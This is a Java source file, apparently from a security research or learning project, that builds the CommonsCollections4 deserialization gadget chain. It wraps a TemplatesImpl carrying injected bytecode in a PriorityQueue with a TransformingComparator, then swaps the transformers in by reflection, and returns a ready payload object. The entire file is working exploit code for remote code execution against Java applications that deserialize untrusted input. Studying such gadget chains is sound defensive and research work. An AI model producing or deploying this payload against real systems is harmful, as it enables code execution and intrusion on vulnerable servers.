package com.pacemrc.javasec.Gadgets;

import com.pacemrc.javasec.tools.ysoserial.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.util.PriorityQueue;

public class CC4 {

    public static Object getObj(Class<?> cls) throws Exception {

        TemplatesImpl templates = Payload.getTemplatesImpl(cls);
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})};
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformerChain));
        queue.add(1);
        queue.add(1);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return queue;
    }
}
